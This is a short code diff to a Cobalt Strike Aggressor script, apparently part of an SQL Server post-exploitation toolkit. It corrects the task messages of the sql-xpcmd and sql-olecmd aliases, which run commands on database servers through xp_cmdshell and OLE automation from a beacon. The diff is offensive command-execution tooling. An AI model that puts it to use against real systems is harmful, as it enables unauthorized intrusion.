@@ -577,7 +577,7 @@ alias sql-xpcmd {
     $link = iff(-istrue $5, $5, "");
     $impersonate = iff(-istrue $6, $6, "");
     
-	btask($1, "Tasked beacon to coerce SMB auth from " . $server);
+	btask($1, "Tasked beacon to execute a command via xp_cmdshell");
 	
 	$args = bof_pack($1, "zzzzz", $server, $database, $link, $impersonate, $command);
 	beacon_inline_execute($1, readbof($1, "xpcmd"), "go", $args);
@@ -605,7 +605,7 @@ alias sql-olecmd {
     $link = iff(-istrue $5, $5, "");
     $impersonate = iff(-istrue $6, $6, "");
     
-	btask($1, "Tasked beacon to coerce SMB auth from " . $server);
+	btask($1, "Tasked beacon to execute a command using OLE automation procedures");
 	
 	$args = bof_pack($1, "zzzzz", $server, $database, $link, $impersonate, $command);
 	beacon_inline_execute($1, readbof($1, "olecmd"), "go", $args);
